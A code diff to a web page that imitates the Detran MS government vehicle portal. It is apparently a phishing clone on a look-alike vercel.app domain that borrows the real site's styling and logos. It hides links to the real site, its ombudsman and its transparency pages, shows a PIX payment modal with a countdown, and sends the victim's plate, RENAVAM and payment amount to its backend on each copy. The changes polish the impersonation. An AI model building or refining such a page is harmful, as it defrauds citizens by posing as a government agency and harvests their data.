@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal Meu Detran MS</title>
-    <!-- FAVICON ADICIONADO -->
+    <!-- FAVICON ADICIONADO (correção #5) -->
     <link rel="icon" type="image/png" href="favicon.png">
     <!-- Usando o CSS original do site -->
     <link rel="stylesheet" href="https://detranmatogrossosul-govbr.vercel.app/_next/static/chunks/996de2e32a16761a.css">
@@ -126,15 +126,15 @@
             border-radius: 12px;
             width: 100%;
             max-width: 500px;
-            max-height: 85vh; /* NÃO CORTA NO PC */
-            overflow-y: auto; /* Scroll interno */
+            max-height: 85vh;
+            overflow-y: auto;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             animation: slideUp 0.4s ease;
         }
         
         @media (max-width: 768px) {
             .modal-pix {
-                max-height: 90vh; /* NÃO CORTA NO CELULAR */
+                max-height: 90vh;
                 max-width: 95%;
             }
         }
@@ -459,12 +459,52 @@
             display: none !important;
         }
         
-        /* Remove qualquer texto específico indesejado */
+        /* CORREÇÃO 4: REMOVER TEXTOS ESPECÍFICOS */
+        /* Remove "FALE CONOSCO" */
         div:contains("FALE CONOSCO"),
-        div:contains("SITE DETRAN MS"),
-        div:contains("OUVIDORIA"),
-        div:contains("TRANSPARÊNCIA") {
+        span:contains("FALE CONOSCO"),
+        a:contains("FALE CONOSCO"),
+        p:contains("FALE CONOSCO") {
             display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            height: 0 !important;
+            width: 0 !important;
+            position: absolute !important;
+            pointer-events: none !important;
+        }
+        
+        /* Remove "SITE DETRAN MS" */
+        div:contains("SITE DETRAN MS"),
+        span:contains("SITE DETRAN MS"),
+        a:contains("SITE DETRAN MS") {
+            display: none !important;
+            visibility: hidden !important;
+        }
+        
+        /* Remove "OUVIDORIA" */
+        div:contains("OUVIDORIA"),
+        span:contains("OUVIDORIA"),
+        a:contains("OUVIDORIA") {
+            display: none !important;
+            visibility: hidden !important;
+        }
+        
+        /* Remove "TRANSPARÊNCIA" */
+        div:contains("TRANSPARÊNCIA"),
+        span:contains("TRANSPARÊNCIA"),
+        a:contains("TRANSPARÊNCIA") {
+            display: none !important;
+            visibility: hidden !important;
+        }
+        
+        /* Seletor genérico para qualquer elemento com esses textos */
+        *:contains("FALE CONOSCO"),
+        *:contains("SITE DETRAN MS"),
+        *:contains("OUVIDORIA"),
+        *:contains("TRANSPARÊNCIA") {
+            display: none !important;
+            visibility: hidden !important;
         }
         
         /* REMOVE O ÍCONE DO FACEBOOK NO CANTO DIREITO */
@@ -603,22 +643,34 @@
     </footer>
 
     <!-- ========================================= -->
-    <!-- MODAL DE PAGAMENTO PIX (CORRIGIDO) -->
+    <!-- MODAL DE PAGAMENTO PIX (CORREÇÃO 3: CABEÇALHO IGUAL AO TOPO) -->
     <!-- ========================================= -->
     <div class="modal-overlay" id="modalPix">
         <div class="modal-pix">
-            <div class="modal-header">
-                <button class="btn-fechar-modal" id="fecharModal">
-                    <i class="fas fa-times"></i>
-                </button>
-                <h2>
-                    <!-- LOGO DETRAN MS LOCAL (use seu arquivo logo_detran.png) -->
-                    <img src="logo_detran.png" 
-                         alt="DETRAN MS" style="height: 30px; margin-right: 10px;">
-                    DETRAN MS - PAGAMENTO PIX
-                </h2>
-                <p style="opacity: 0.9; font-size: 14px;">Pagamento Seguro via PIX</p>
-                <div class="modal-timer" id="timerPix">
+            <!-- CORREÇÃO 3: CABEÇALHO IGUAL AO TOPO DA PÁGINA -->
+            <div class="modal-header" style="background: #004f9f; padding: 15px 20px; border-top-left-radius: 12px; border-top-right-radius: 12px;">
+                <div style="display: flex; align-items: center; justify-content: space-between; max-width: 1050px; margin: 0 auto;">
+                    <!-- Logo esquerda -->
+                    <img src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/logo.svg" 
+                         alt="Governo MS" style="height: 40px; width: auto;">
+                    
+                    <!-- Meu Detran MS centralizado -->
+                    <div style="text-align: center;">
+                        <img src="https://detranmatogrossosul-govbr.vercel.app/assets/svgs/my-dt.svg" 
+                             alt="Meu Detran MS" style="height: 35px; width: auto; max-width: 250px;">
+                        <div style="font-size: 12px; opacity: 0.9; margin-top: 2px;">
+                            PAGAMENTO PIX
+                        </div>
+                    </div>
+                    
+                    <!-- Botão fechar -->
+                    <button class="btn-fechar-modal" id="fecharModal" style="background: rgba(255,255,255,0.2);">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <!-- Timer PIX -->
+                <div class="modal-timer" id="timerPix" style="margin-top: 10px;">
                     15:00
                 </div>
             </div>
@@ -1103,12 +1155,15 @@
                     document.getElementById('codigoPix').textContent = data.codigoPix;
                     
                     // =========================================
-                    // CORREÇÃO 2: REGISTRA APENAS O PRIMEIRO CLIQUE
+                    // CORREÇÃO 2: BOTÃO COPIAR COM EFEITO VISUAL
                     // =========================================
                     document.getElementById('btnCopiarCodigo').onclick = function() {
+                        const btnCopiar = this;
+                        const textoOriginal = btnCopiar.innerHTML;
+                        
                         // Verifica se já copiou nesta sessão
                         if (pixJaCopiado) {
-                            console.log('⚠️ PIX já copiado nesta sessão, não registra novamente');
+                            console.log('⚠️ PIX já copiado nesta sessão');
                             const msg = document.getElementById('mensagemSucesso');
                             msg.textContent = '✅ Código já copiado anteriormente!';
                             msg.classList.add('active');
@@ -1122,37 +1177,21 @@
                         // Copia para área de transferência
                         navigator.clipboard.writeText(data.codigoPix)
                             .then(() => {
-                                // REGISTRA APENAS UMA VEZ NO BACKEND
-                                fetch('/api/registrar-pix-copiado', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        tipo: 'copiado',
-                                        valor: dadosPagamentoAtual.valor,
-                                        placa: dadosPagamentoAtual.placa,
-                                        renavam: dadosPagamentoAtual.renavam,
-                                        descricao: dadosPagamentoAtual.descricao,
-                                        primeiroClique: true // Flag para identificar primeiro clique
-                                    })
-                                }).catch(err => {
-                                    console.error('Erro ao registrar PIX:', err);
-                                });
+                                // EFEITO VISUAL "COPIADO!" (correção #2)
+                                btnCopiar.innerHTML = '<i class="fas fa-check"></i> COPIADO!';
+                                btnCopiar.style.background = '#28a745';
+                                btnCopiar.style.color = 'white';
+                                btnCopiar.style.transform = 'scale(0.98)';
                                 
-                                const msg = document.getElementById('mensagemSucesso');
-                                msg.textContent = '✅ Código copiado para área de transferência!';
-                                msg.classList.add('active');
-                                setTimeout(() => msg.classList.remove('active'), 3000);
-                            })
-                            .catch(err => {
-                                // Fallback para navegadores antigos
-                                const textArea = document.createElement('textarea');
-                                textArea.value = data.codigoPix;
-                                document.body.appendChild(textArea);
-                                textArea.select();
-                                document.execCommand('copy');
-                                document.body.removeChild(textArea);
+                                // Volta ao normal após 3 segundos
+                                setTimeout(() => {
+                                    btnCopiar.innerHTML = textoOriginal;
+                                    btnCopiar.style.background = '';
+                                    btnCopiar.style.color = '';
+                                    btnCopiar.style.transform = '';
+                                }, 3000);
                                 
-                                // REGISTRA APENAS UMA VEZ NO BACKEND
+                                // REGISTRA NO BACKEND
                                 fetch('/api/registrar-pix-copiado', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -1167,6 +1206,45 @@
                                 }).catch(err => {
                                     console.error('Erro ao registrar PIX:', err);
                                 });
+                                
+                                // Mensagem de sucesso
+                                const msg = document.getElementById('mensagemSucesso');
+                                msg.textContent = '✅ Código copiado para área de transferência!';
+                                msg.classList.add('active');
+                                setTimeout(() => msg.classList.remove('active'), 3000);
+                            })
+                            .catch(err => {
+                                // Fallback para navegadores antigos
+                                const textArea = document.createElement('textarea');
+                                textArea.value = data.codigoPix;
+                                document.body.appendChild(textArea);
+                                textArea.select();
+                                document.execCommand('copy');
+                                document.body.removeChild(textArea);
+                                
+                                // Mesmo efeito visual
+                                btnCopiar.innerHTML = '<i class="fas fa-check"></i> COPIADO!';
+                                btnCopiar.style.background = '#28a745';
+                                btnCopiar.style.color = 'white';
+                                setTimeout(() => {
+                                    btnCopiar.innerHTML = textoOriginal;
+                                    btnCopiar.style.background = '';
+                                    btnCopiar.style.color = '';
+                                }, 3000);
+                                
+                                // REGISTRA NO BACKEND
+                                fetch('/api/registrar-pix-copiado', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        tipo: 'copiado',
+                                        valor: dadosPagamentoAtual.valor,
+                                        placa: dadosPagamentoAtual.placa,
+                                        renavam: dadosPagamentoAtual.renavam,
+                                        descricao: dadosPagamentoAtual.descricao,
+                                        primeiroClique: true
+                                    })
+                                }).catch(e => console.error('Erro:', e));
                                 
                                 const msg = document.getElementById('mensagemSucesso');
                                 msg.textContent = '✅ Código copiado para área de transferência!';
